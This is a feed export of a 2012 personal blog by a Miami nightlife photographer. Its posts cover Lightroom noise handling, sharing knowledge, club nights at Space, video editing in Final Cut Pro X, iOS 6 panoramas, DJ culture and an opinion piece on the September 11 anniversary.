<p>So, what I keep in mind is my end result and intent. Despite the fact I shoot with a camera which has a 22-megapixel sensor, most of my images are downsized to 960 x 640. At that resolution, noise is generally hard to pick out. The image at the lead of this article is actually quite noisy in some respects. However, you can&#8217;t see much of it since it has been reduced in size by many multiples to be displayed on your monitor. And, unless you have a Retina display (and yes, you&#8217;ll probably have to forget a lot of what I just told you in that regard), there is really not a huge amount of detail present in the above image.</p>

<p>Now, if that image were to go to print, I would usually insist on matte paper. Matte paper masks the noise wonderfully. The texture overrides a lot of the noisier characteristics of the image.</p>

<p>If I&#8217;m forced into a glossy presentation, I then usually move on to &#8220;plan B&#8221;. Plan B doesn&#8217;t involve a lot of work, and doesn&#8217;t involve any noise reduction plugins or techniques. Note, this whole idea assumes you shot RAW. You are shooting RAW, right? Another assumption I&#8217;m making here is that I&#8217;ve probably already told you to use Lightroom. If not, the concepts carry over. Drop me a line if you need help in another package, maybe I can figure it out for you.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lr1.png" width="845" height="467" title="'LR'" ></p>

<p>Basically, I ask myself, <em>&#8220;Where does this noise exist in the color spectrum?&#8221;</em></p>

<p>In most cases, I find the noise exists in the red and magenta channels of the color spectrum. Which does make sense, since noise tends to be a function of heat and energy in a digital sensor system, and that energy conveys itself as a lower frequency &#8220;color&#8221; of sorts. Now, some people would suggest desaturating in the affected channels. Doesn&#8217;t really work that way. If you do this, you are left with a muddled grey mess, which looks worse than the existing noise did.</p>

<p>So, what I do is I &#8220;cool&#8221; the image off a bit. I bring down the color temperature slider, sometimes as low as 4000K. Typically I&#8217;m only employing this technique in high-ISO nightclub images, which tend to not utilize flash and the skin tone of any human subjects in the frame is of little concern, i.e. they are already an odd color, so shifting it one way or the other won&#8217;t destroy the idea of the image. Plus, in RAW you can adjust your other color bands to make up for any shift. Anyways, what I do is I bring our color temp down, until I see the &#8220;red&#8221; noise minimize itself somewhat.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lr2.png" width="444" height="230" title="'LR2'" ></p>

<p>And, if that is not sufficient for our needs, I&#8217;ll turn down the luminance of the affected colors if possible. If this piece is really critical for something, I will actually do the above steps in Photoshop, rather than Lightroom, to allow for more fine control over segments of the image.</p>

<p>Basically, with these steps, I&#8217;m minimizing the noise by altering it&#8217;s appearance and luminosity in the image, which does not destroy the overall sharpness and focus characteristics of the image. Plus, the saturation of desired colors and areas is left alone.</p>

<p>And that&#8217;s actually kind of it, ya know? I&#8217;m not too big into noise reduction. Much like it says on the back of any piece of electronics you own, I just &#8220;accept interference from other sources&#8221; in my image, and keep moving on to get the photos I want.</p>

<p>Sidebar: Did you know your digital SLR is susceptible to the radio frequency noise present everywhere? And present in huge quantities in a nightclub? Think about it. There&#8217;s giant speakers with giant magnets mere feet from your camera body. There&#8217;s massive amounts of electrical energy flowing through poorly-shielded cables. There&#8217;s hundreds of people, each one with a cell phone on them. There&#8217;s security guys with radios. There&#8217;s Wi-Fi network signals, the list goes on. There&#8217;s a lot of noise pinging about in the club that makes it&#8217;s way into your camera&#8217;s guts. It&#8217;s a miracle it even works sometimes. So yeah, my real advice is to disregard this entire article and just keep shooting. But if you insist on dealing with the noise, I hope this helped. Also, every successive generation of digital SLR technology deals with the noise more effectively. Pretty soon, ISO 6400 will look like ISO 400 does today.</p>

<p>Sidebar 2: I am not qualified in physics or electronic systems as of yet. I might be way off base on some of what is behind all this. I used some of the free knowledge available online to figure out the basics. However, my techniques produce the desired result. So there&#8217;s that.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On passing on knowledge...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/20/on-passing-on-knowledge-dot-dot-dot/"/>
    <updated>2012-09-20T00:57:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/20/on-passing-on-knowledge-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/rs-6552.jpg" width="960" height="640" title="'Roger Sanchez - A real DJ at work'" ></p>

<p>A lot of people ask me about my photos, &#8220;How did you do that?&#8221;</p>

<p>Well, truth be told, it isn&#8217;t a huge secret on how I, or any other working photographer, pulls off their images&#8230;</p>

<!-- more -->


<p>I was having a discussion with <a href="http://ryanalynporter.com">Ryan</a> the other day, in response to my prior posting about <a href="http://www.dan-vidal.com/blog/2012/09/15/some-of-us-are-more-than-that-guy-with-the-camera/">being more than the guy with the camera.</a></p>

<p>Ryan bought forth the term <em>agalmics</em> during our discussion. In a nutshell, agalmics is:</p>

<blockquote><p>The study and practice of the production and allocation of non-scarce goods.</p><footer><strong>Robert Levin</strong> <cite><a href='http://www.openverse.com/~dtinker/agalmics.html'>Agalmics - the Marginalization of Scarcity</a></cite></footer></blockquote>


<p>And yes, that was an excuse to show off the shiny blockquote tag here in Octopress. Which actually ties into what I&#8217;m talking about here.</p>

<p>The internet has made knowledge of most subjects a non-scarce resource. From the implementation of the blockquote tag here on my blog, to just how the heck I composed that image of Roger that leads off the article, to the basic techniques Roger uses to mix music together in his DJ sets, the transfer of knowledge has definitely become a non-scarce resource. It&#8217;s really not much of an exaggeration to say that the sum of human knowledge is online these days.</p>

<p>With a few exceptions, the directions on how to do just about anything have been documented online, and those directions are freely accessible. And if they are not freely accessible at first, some more searching will bring forth a free alternative on how to get something done. I mention that because some academic research is locked behind paywalls. However, similar research is often freely accessible, and the assiduous student can often come to the same conclusions the researchers hiding behind paywalls do.</p>

<p>But anyways, with regards to my photo work, I don&#8217;t mind freely passing on the knowledge, even if I paid for it a long time ago. If I&#8217;m stingy with the knowledge, the person asking for it, if they are determined enough, will seek it out on their own, and undoubtedly discover it elsewhere. Ryan put it bluntly:</p>

<blockquote><p>An agalmic entrepreneur&#8217;s currency is his reputation.</p><footer><strong>Ryan Porter</strong> <cite><a href='http://forum.talknightlife.com/viewtopic.php?f=3&t=20149&st=0&sk=t&sd=a'>EDM Is the Wimpiest Youth Movement Ever? - TNL Thread</a></cite></footer></blockquote>


<p>My reputation (other than being a scandal!) tends to lie in the direction that I am in possession of a lot of knowledge, and I have no qualms about giving it away. It&#8217;s a currency that can be spent and earned just like money nowadays. And simply because people have faith that the knowledge will benefit them. Much like the US Dollar is only worth something because the world believes it is worth something. We&#8217;ve assigned value to it, and it is no longer based on the reserves of a scarce material, i.e. gold.</p>

<p>But unlike gold, knowledge and information are no longer scarce. It&#8217;s all out there, free for the taking. Even if you do not own your own computer or have your own internet connection, you can avail yourself of free resources to get online, and access the same information a guy on his iPad next to his pool on Star Island can.</p>

<p>So with that in mind, I tend to not object if someone sincerely asks how I manage to pull something off in the photographic realm. I get something out of it, myself, personally. I tend to be a miserable rat bastard about some things, like the political system, the popularity of dubstep, ravers, fluorescent lighting, BlackBerries, and American Idol. So I guess, subconsciously, to balance out that deficit in the karma bank, I kind of get a visceral thrill when I can pass on what I&#8217;ve learned. That, and when it comes to photo work at least, I can only pass on the parameters of what I&#8217;ve done, it&#8217;s up to the person I&#8217;m teaching to implement it at the right time. It&#8217;s like your parents can tell you how to drive a car, but eventually you have to get behind the wheel and do it yourself. And once you are behind the wheel, it&#8217;s a lot different than when Mom told you not to stomp on the accelerator.</p>

<p>And as far as someone using that knowledge against me? Well, I don&#8217;t see it as being used against me, since I really don&#8217;t play that game. If someone takes what I&#8217;ve showed them and apes my style, and gets more work than I do, that&#8217;s fine. Even if they don&#8217;t acknowledge where they learned it from. Recognition and attribution are nice and &#8220;proper internet etiquette&#8221;, but I don&#8217;t expect it these days. I figure it is something they have to live with. And I&#8217;m really not in the recognition game, either. If what I do helps a friend or a client do well, I usually get taken along for the ride. There&#8217;s a lot of things at play out in the world that are way more powerful than myself, and I figure it&#8217;s easier to just ride the wave and catch a ride, rather than try to take on those forces directly. Either way, I end up doing alright for myself.</p>

<p>With that in mind, I do plan on passing on little bits and pieces of what I know in this here blog, kind of as a way to balance out some of the more ornery aspects of it, and also just for the sake of composing my thoughts on &#8220;paper&#8221;. Sometimes it&#8217;ll be about photographic and video techniques I know, other times it&#8217;ll be about coding this here site, and maybe on occasion some bits and pieces on the fine art of Mercedes maintenance as I learn more about that.</p>

<p>I&#8217;m on a bit of a roll right now, let me kick off the first one. In the next post. Let&#8217;s keep this somewhat organized.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fall is almost here...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/17/fall-is-almost-here-dot-dot-dot/"/>
    <updated>2012-09-17T21:45:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/17/fall-is-almost-here-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/17//' data-instagram-url='http://instagr.am/p/PsrElOAgMN/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/16e25458012f11e28ac522000a1d0104_7.jpg' alt='Scenes from @djrogersanchez @clubspacemiami @jhartlein @kdematte @sara_p523 @fanoamous_nexus @zhantra http://bit.ly/O9ICq6 for more!' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.784715407,-80.193181247'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.784715407,-80.193181247&markers=25.784715407,-80.193181247&zoom=14&size=612x200&sensor=false' alt='Club Space' /></a><br/>Taken at Club Space</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='282790307458843405_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Like a lot of tourist areas, Miami has a high and low season. Typically, ours high season goes from late September until late April. Simply because of the weather.</p>

<p>Though in recent years there&#8217;s been less of a difference, due to economic factors. The high season isn&#8217;t as &#8220;high&#8221; as it used to be, and people will brave the torrid heat and humidity during the summer to save on hotel rates and flight costs.</p>

<p>But still, the fall season is almost here. Warm, but not torrid days, and cool breezy nights will be the norm. It&#8217;s the time of the year which makes living in the Miami area worthwhile.</p>

<p>Already you can see the change. This past weekend saw temperatures in the mid-80s (upper 20s for you guys who use Celsius), with a noticeable decrease in humidity. The biggest indicator is I don&#8217;t have to wait as long for the a/c unit in the 210 to bring things down to a reasonable level. I could crank it, sure, but oddly enough Mercedes says that &#8220;it really doesn&#8217;t speed things up too much&#8221;. And I&#8217;ll side with the engineers on this one. The 210 is my baby of sorts.</p>

<p>And the excitement was definitely noticeable at Space over the weekend. Like I mentioned in my last post, the talented Roger Sanchez was on the decks. One of the few DJs on the scene not caught up with doing stage shows and 90-minute sets, Roger kept us going for over nine hours, from 3 AM - 12 noon. I broke my &#8220;Leave Space at 8:30&#8221; rule by a fair margin. It was worth it though. A lot of old friends showed up, and stayed late, so I figured I would as well. As a single guy, I kind of go where my friends are, ya know?</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/rs-6661.jpg" width="960" height="640" title="'The S-Man himself!'" ></p>

<p>But Roger definitely delivered on the musical end. I&#8217;m not much of a trainspotter (&#8220;It&#8217;s the song that goes mmmm-tsss right?&#8221;) but he kept the crowd occupied with a great mix of diverse music, ranging from vocal-infused house to extended tribal percussive tracks. Which kept the people there socializing and dancing and drinking. A successful night for Space, by any metric. And a great photographic journey for me. I report what&#8217;s there, and if what is there isn&#8217;t interesting or compelling, it comes through in my work. And if it is interesting and compelling, it will definitely show. If you are of a mind, <a href="http://seenightlife.com/users/pod/albums/roger-sanchez-returns-to-space">click here</a> to see the end results. It&#8217;s a bit of a large gallery due to the length of time I was present at Space, but there you have it.</p>

<p>The fall is here!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Some of us are more than that guy with the camera.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/15/some-of-us-are-more-than-that-guy-with-the-camera/"/>
    <updated>2012-09-15T21:40:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/15/some-of-us-are-more-than-that-guy-with-the-camera</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/pete-5469.jpg" width="960" height="640" title="'Jordyn on the box at Space'" ></p>

<p>Sometimes when I think about what to put here too much, I&#8217;m at a loss. I can&#8217;t force myself to write. Usually, when I drop an article in here, it&#8217;s in relation to something I&#8217;ve done, read, or saw. This blog is very reactive and not proactive right now, I guess. This post is definitely reactive.</p>

<p>A few minutes ago, I read a blog entry by local shooter <a href="http://helloimscott.com/">Scott Alexander</a> on how he&#8217;s burnt out on his primary subject, erotica and fetish, but not for the reasons you would think.</p>

<!-- more -->


<p>In the <a href="http://helloimscott.com/2012/09/adapting-new-battle-strategies/">blog post</a>, he sums it up eloquently:</p>

<blockquote><p>But it’s more than just being burnt out from this business. It’s so many different things. I tire of people looking at me sideways or making assumptions about me and my life. I tire of the judgement. I tire, when meeting someone new, that because someone else has said something to them, they’ve already made up in their mind what I’m all about and don’t even TALK to me with any kind of respect. I tire of not being taken seriously.</p><footer><strong>Scott Alexander</strong> <cite><a href='http://helloimscott.com/2012/09/adapting-new-battle-strategies/'>Adapting New Battle Strategies</a></cite></footer></blockquote>


<p>In a nutshell (correct me if I&#8217;m wrong Scott), it seems he is tired of being judged as a smut-peddler, when there&#8217;s so much more to what he does.</p>

<p>Now, to a lesser extent, I encounter this on occasion when I talk to people about what I do, regardless of whether I meet them inside or outside of the club environment. Without sounding pretentious I like to think that I put my own spin on the images I capture. Since I have the luxury (haha) of running my own site, I have complete freedom to capture the images how I want them. Of course, I have to make some concessions with the client (that is why you will see photos that look like &#8220;typical&#8221; club shots), but I do have the flexibility to shoot what I want as well.</p>

<p>Part of the reason I can do that is the amount of time I&#8217;ve been rattling around Miami&#8217;s club scene, which, by my watch, is around 15 years at this point. That&#8217;s an eternity. I&#8217;ve been around longer than almost every venue in town, and most promoters and DJs. I got started in this when the post of &#8216;club photographer&#8217; was a rare thing. And since it was rare, I was able to set the tone for myself, i.e. I wasn&#8217;t under the gun to shoot 100000 images of drunk girls, and as time went on, even the people who wanted me to do so, ended up conceding, or moving on to someone who would shoot 10000 images of drunk girls.</p>

<p>In a nutshell that explains why I&#8217;m not rich off of photography and have to do web-related odd jobs to pay for things. Making money from producing just the photos (or any art for that matter) you want is extremely challenging.</p>

<p>In this modern era, I would probably not be able to score a single club-related photo gig if I was starting out. Simply because there&#8217;s too many people/sites willing to shoot 10000 drunk-girl images for cheap, and almost zero demand for any sort of artistry in the photos captured. Nightclubs just want photos for social network promotion. And hey, they&#8217;re running a business, and it costs an obscene amount of money to run it. FYI, a large nightclub costs around $30,000 a night sans DJ fees just to operate! So yeah, they kind of need people to show up.</p>

<p>Fortunately, I&#8217;ve got work via my veteran status and longtime connects, but if I had to do it all over again today (with the same eye/mindset), I probably wouldn&#8217;t do it at all.</p>

<p>However, many would and are doing it. They will shoot 10000 photos a night of drunk girls with their cameras on &#8220;P&#8221; or green mode. Fire away, give &#8216;em the little card, and move on to the next target. And annoy the DJ while they are at it.</p>

<p>And unfortunately, since this type of photographer is ubiquitous to the club scene, I&#8217;m sometimes lumped into the same mold as they are. Much as Scott is probably lumped into the same mold as whomever does the shooting for Bangbus, even though their material is worlds apart.</p>

<p>I see it sometimes, when people ask me what I shoot, and I try my best to sugarcoat it. &#8220;Yes, I shoot special events, concerts, and nightlife&#8230;&#8221;. Which basically means I spend time taking photos in loud, hot, smoky rooms filled to the gills with drunk people.</p>

<p>However, even in those loud, smoky, drunk rooms, there&#8217;s ample opportunity to compose and capture aesthetically pleasing images. The image up top is one example.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ldw-4558.jpg" width="960" height="640" title="'Jordyn again - yes, I shoot her a lot'" ></p>

<p>This would be another. In my humble opinion, this isn&#8217;t a side of nightlife that people normally notice. And I like to capture that, to show those rare moments when something visually amazing happens for a split second, in a place most people consider just a loud, hot, smoky, drunk room.</p>

<p>It&#8217;s why I carry sample images on my iPhone of what I&#8217;m able to do. If I can hold someone&#8217;s attention for five seconds before they run away, since they judge me as being &#8220;That guy with the camera in the club&#8230;&#8221;, I usually show them just what I mean. Then their opinions change.</p>

<p>However, on occasion the whole issue does get tiring. Which is why I&#8217;ve branched out into shooting scenics recently. Now, it&#8217;s not to force myself to shoot something I don&#8217;t like. I really do like scenics. On occasion in the past I&#8217;ve shot some rather stunning ones. But nowadays, I&#8217;ve actually begun to market myself as being able to do that as well. The nice thing is, I&#8217;m able to spring that as a surprise on the unsuspecting critic.</p>

<p><img src="https://s3.amazonaws.com/dvblog/bridge-4199_blog.jpg" width="960" height="640" title="'Islamorada Crossing'" ></p>

<p>Plus it&#8217;s pretty relaxing. I actually took this photo and then just sat down under the bridge for an hour afterwards.</p>

<p>This last piece has actually sold a few copies over on my <a href="http://dan-vidal.fineartamerica.com">FAA page</a>. And when I show it to a critic who lumps me in with the likes of the unscrupulous run-and-gun shooters, they usually get quite embarrassed.</p>

<p>However, even if they do walk away, I don&#8217;t mind. I still find enjoyment in shooting nightlife and events. The varied situations, the challenge of shooting in dark rooms, the dynamics, and getting to see some friends of mine all contribute to that, even after fifteen years. The burnout feeling comes and goes, but for the most part, it goes. Sometimes when I want to just stop, I&#8217;ll find some glimmer (no kids, &#8216;glimmer&#8217; is not the name of a new drug!) that keeps me going. Aside from the fact that I can&#8217;t argue with the money, of course.</p>

<p>I&#8217;ll be at Space tonight/tomorrow morning around 3 AM for one of the few good DJs left in the scene, Roger Sanchez. If anyone from here reads this and is there, come and say hello. I&#8217;ll explain more in detail time permitting.</p>

<p>Scott, if you&#8217;re reading, don&#8217;t take any guff from those swine. You&#8217;ve got a great body of work, and it speaks for itself. If anything drop on them your collection from driving across the country and back on a scooter. That was amazing.</p>

<p>Sidebar: I drove across the country once. It was in a moving van equipped with an first-gen iPad 3G, 3 diverse smartphones, a cooler full of rations, and spares for everything. Halfway through I wanted to blow up the moving van and take my camera backpack, iPad, and some clothes and go buy a cheap scooter and finish the ride that way by going the scenic route. I&#8217;m gonna figure out how to make these sidebars on the side, soon.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[You need to think fourth-dimensionally, Marty!]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/15/you-need-to-think-fourth-dimensionally-marty/"/>
    <updated>2012-09-15T12:42:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/15/you-need-to-think-fourth-dimensionally-marty</id>
    <content type="html"><![CDATA[<iframe src="http://player.vimeo.com/video/49508063" width="960" height="540" frameborder="1" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p> <p><a href="http://vimeo.com/49508063">• Season 8 Finals - Jive With The Band •</a> from <a href="http://vimeo.com/dvdigital">Dan V</a> on <a href="http://vimeo.com">Vimeo</a>.</p></p>

<p>I&#8217;m relearning the fine art of video editing. I learned on an analog system (real film!) though the concepts carry over. It&#8217;s all about the story.</p>

<!-- more -->


<p>My current weapon of choice for editing is Final Cut Pro X. While the dyed-in-the-wool digital video types give it hell for being too much like iMovie and not a &#8220;real&#8221; pro product like it was, I find FCP-X suits my fancy for the basic video projects I&#8217;m doing myself at the moment. Like I&#8217;ve mentioned in the past, I usually just shoot, and pass my results off to someone with more editing and VFX skills like <a href="http://deepsleepstudio.com/">Alex and his team over at Deepsleep</a>. However, even they use Final Cut Pro X for their final editing workflow.</p>

<p>In the end, an edit is an edit. You&#8217;re trying to tell a story, and all the VFX goodies and title transitions in the world won&#8217;t help if your timing and sequencing is off. That&#8217;s actually something that takes years to master. I know in my head where I want to go with the story, I&#8217;m still just learning the modern tools of the trade. So yes, sometimes my edits are &#8220;off&#8221;. It&#8217;s a work in progress.</p>

<p>You have to think fourth-dimensionally. When shooting and when editing. You have to have an idea of what you want to shoot, and during the edit, what you have in your &#8220;bin&#8221;. In an event like Jive, the regular repeat singers often perform twice throughout the night, once in the beginning, and once near the end to really knock the crowd out. I have to remember that sometimes I&#8217;ll have &#8220;better&#8221; footage of say, Sir Diego, from later on in the night, even if his first performance knocked it out of the park. Sometimes it&#8217;s the reverse actually. Either way, I have to keep in mind I have multiple takes. Keeping the bin coherent is key.</p>

<p>And this is just on the video side. The audio side is a whole other ball of wax. I record with a basic Sennheiser stereo mic, though I do want to progress to one of their wireless kits where I take a feed straight from the FOH mixer at the bar. That is a $600 investment though, and I&#8217;m currently not shooting enough live music events to justify the outlay. It&#8217;s an amazing widget regardless, though.</p>

<p>Regardless, if you are a photographer getting into video, just remember to think fourth-dimensionally. You are composing a project that exists not only in space, but in time.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iOS 6 does panoramics natively.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/14/ios-6-does-panoramics-natively/"/>
    <updated>2012-09-14T13:14:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/14/ios-6-does-panoramics-natively</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/14//' data-instagram-url='http://instagr.am/p/PkEAyfggHZ/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/68dd4ccafe8e11e1959322000a1e9e0c_7.jpg' alt='Pano espectacularrrrr. #ios6' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/lord kelvin'>Lord Kelvin</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='280366723205562841_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p></p>

<p>iOS 6 allows iPhone 4s and iPhone 5 users to take panoramas using the native Camera App. It&#8217;s kinda cool.</p>

<!-- more -->


<p></p>

<p>I&#8217;m actually very impressed with the results, considering it&#8217;s generated with the camera inside of a phone. There&#8217;s noise and so forth, but as a quick &#8220;live&#8221; panoramic tool, it is great.</p>

<p>Yes, I&#8217;m aware apps exist that do this anyways on both iOS and Android, but this functionality baked in, as it were, is pretty nifty. It also allows for smoother integration in terms of sending out via email or social media.</p>

<p>Now, even more so, the death of the pocket camera is imminent. An iPhone can take awesome images, as well as being a general-purpose pocket computer/communicator. The market in cameras will define itself by three tiers:</p>

<blockquote><p>DSLRs</p></blockquote>


<p>Pretty much what you see today. Digital still/video cameras with their roots in film SLRs, with the same accessories and lens systems.</p>

<blockquote><p>Compact &#8220;rangefinder&#8221; style cameras.</p></blockquote>


<p>Small bodies with or without interchangeable lenses with a large sensor. Think of the Sony NEX line or Canon&#8217;s EOS-M. You&#8217;ll see pros pick these up as a secondary or a &#8220;stealth&#8221; camera. And well-heeled hobbyists who want a nice system but without the bulk of a DSLR.</p>

<blockquote><p>Cameras built into smartphones and tablets.</p></blockquote>


<p>The iPhone 4s and the forthcoming iPhone 5 cameras are superb. Except for the flash function, it still sucks. But if you know what you are doing, who needs flash? There&#8217;s apps that allow full manual control of the cameras, too. So there&#8217;s your pocket camera solution.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[When did the DJ become more important than the crowd?]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/12/when-did-the-dj-become-more-important-than-the-crowd/"/>
    <updated>2012-09-12T11:33:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/12/when-did-the-dj-become-more-important-than-the-crowd</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/pete-5312.jpg" width="960" height="640" title="'Thanks!'" ></p>

<p>A random blog post over at <a href="http://www.faithfanzine.com/?p=1590">Faith Fanzine</a> caught my eye today. One quote from the article summed it up:</p>

<blockquote><p>When did we start watching a DJ instead of dancing with our mates , why do we put up with idiotic people taking up the floor who are filming the DJ ,why is the best dance floors now being cut to ribbons to provide extra table space for naff VIP’s ( Pacha in Ibiza hang your head in shame ) ,people with more money than taste and who in some extreme situations in the US have had DJs thrown off the decks because they did not like the music .</p></blockquote>


<p>Yes, when did we stop dancing?</p>

<!-- more -->


<p></p>

<p>I can&#8217;t dance, that&#8217;s a given. I pop around and do monkey moves, get embarrassed, and then I shuffle off to the side. But in the end, I&#8217;m still interacting with the crowd and my friends, and squeezing in a few photo ops as I mix and mingle. I take a few (OK a lot in some cases!) photos of the DJ, but I&#8217;m not in the middle of the dancefloor gawking at the booth the entire night.</p>

<p>It&#8217;s actually part of the reason I prefer clubs to the current form of dance music experience, the festival/concert setup.</p>

<p><img class="center" src="http://seenightlife.com/photos/5595/original_MIA-6086.jpg" width="427" height="640"></p>

<p>In those setups, there is a stage, and a general admission &#8220;pit&#8221;, much like a rock concert. The setup works well for rock concerts, since the whole point of a live musical act performing on stage is so you can see them work their instruments and sing. The act of a DJ mixing, no matter what tools they use, is generally a very passive act, and doesn&#8217;t lend itself much to a rock-performance aesthetic, no matter how much jumping around and handwaving the DJ is doing. Anything more than that (I&#8217;m looking at you, Aoki), smacks of being too contrived and &#8220;trying too hard&#8221;. Essentially the guy playing other people&#8217;s music in the club has been placed in the center of a stage usually reserved for rockstars. And no matter how many pretty LED screens and image-mapped 3D renderings one throws up there, it comes down to that he&#8217;s still up there playing back prerecorded sounds in a predetermined sequence. And a lot of DJs in concert situations don&#8217;t even alter their playlists much from date to date. Zero musical flexibility. Might as well put an iPhone up there and play a prerecorded mix.</p>

<p>Plus, the shows are often at capacity, so there is actually zero room for dancing, and certainly no room for social interaction, since everyone is either focused on the guy pressing play on their laptop, or has their head buried in their phone, stroking their ego on Facebook.</p>

<p>I&#8217;m generally regarded as a borderline sociopathic personality. However, I do value social interaction when I&#8217;m out for a night of entertainment. It&#8217;s why I value the few clubs left that actually encourage social discourse and interaction. Venues in town like Space, the Vagabond, and so forth, while they book DJ talent, don&#8217;t rely on the DJ exclusively to drive their business. Some of my best nights out have been with the local guys on the decks, and I&#8217;m just there with my friends, having a good time. Some DJs still get it. <a href="http://seenightlife.com/users/pod/albums/pete-tong-at-space">Pete Tong</a> is a great example. This past weekend, he took to the decks at Space. No grandstanding, no tricks, he just played a great soundtrack to a night/morning out, and the crowd responded in kind. People were dancing, socializing, and having a good time, but not buried in their phones or gawking at the booth for hours on end. So there&#8217;s hope&#8230;</p>

<p>Let&#8217;s save the rockstar setup for the rockstars.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The obligatory September 11th Post.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/11/the-obligatory-september-11th-post/"/>
    <updated>2012-09-11T14:36:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/11/the-obligatory-september-11th-post</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/dade.png" width="538" height="359" title="'September 11th Post'" ></p>

<p>Today is the 11th Anniversary of the September 11th attacks on New York City. The social media sphere is filled with the obligatory graphics and memes of eagles, the WTC towers, and our soldiers deployed in Afghanistan. However, it was the above statement by my friend Dade which made the most sense thus far.</p>

<!-- more -->


<p>Don&#8217;t get me wrong, the actual attack on New York on that fateful Tuesday morning was, in and of itself, a disaster. Over 3000 people died in what was the most brutal attack on American soil since the founding of the country.</p>

<p>However, as Dade said, the real disaster is in how it has been handled since then.</p>

<p>9/11 has become the crutch of American society. Where once we would keep moving forward in the face of adversity, we now cower behind closed doors, and beg our elected officials to do something, anything, to rid the world of the supposed terrorist menace, regardless of the implications to our liberties and our freedoms.</p>

<p>Have we become that timid and complacent that we will give up our essential freedoms and liberties just in the name of the illusion of safety? I say illusion since if someone wants to attack us on our own soil, they will, regardless of the safeguards put into place. I think, at the end of the day, what America can&#8217;t cope with is the sobering realization that the world is rather ambivalent to our lifestyle and values. The bulk of the world doesn&#8217;t have the time or the energy to waste on hating us. Sure, a few neckbeards in the Middle East might march around in circles screaming &#8220;Death to the Great Satan&#8221; (that&#8217;s us, by the way!), but they don&#8217;t represent the majority opinion. The people in the Middle East, in general, are too busy with their daily activities to waste much energy screaming about us. They have families, jobs, and lives, just like we do.</p>

<p>Same for the rest of the world. No one cares. They just want what&#8217;s best for them, and what&#8217;s best for them doesn&#8217;t involve chanting overused slogans in town squares and burning American flags. Newsflash, most of those actions are staged and cleverly edited to overexpose the threat, making it easier for our government to pass senseless legislation like the PATRIOT Act, and the various regulations that enable agencies like the TSA to exist.</p>

<p>But, as long as the government appears to be doing something about the problem (if there even is a problem), the people are timid and complacent. As long as American Idol continues to broadcast, and people can continue to measure their self-worth in Facebook Likes and Klout scores, the people are cowed into submission, and they don&#8217;t even know it. It&#8217;s a modern day equivalent of bread and circuses. There&#8217;s an enemy we can all get riled up about (the supposed beard with the AK-47), and we have our circuses in the form of social networks and mindless reality shows. Sure, such things existed before September 11, 2001, but it wasn&#8217;t nearly as execrable as it was after the attacks. Even Pearl Harbor, which led to an actual global conflict, didn&#8217;t precipitate the wholesale revocation of civil liberties, and the weakening of our resolve. If anything, Pearl Harbor served as a catalyst for us to defend those freedoms. Maybe terming those people &#8220;The Greatest Generation&#8221; isn&#8217;t such a´clichéd term after all. I can only wonder what future historians will term our generation.</p>

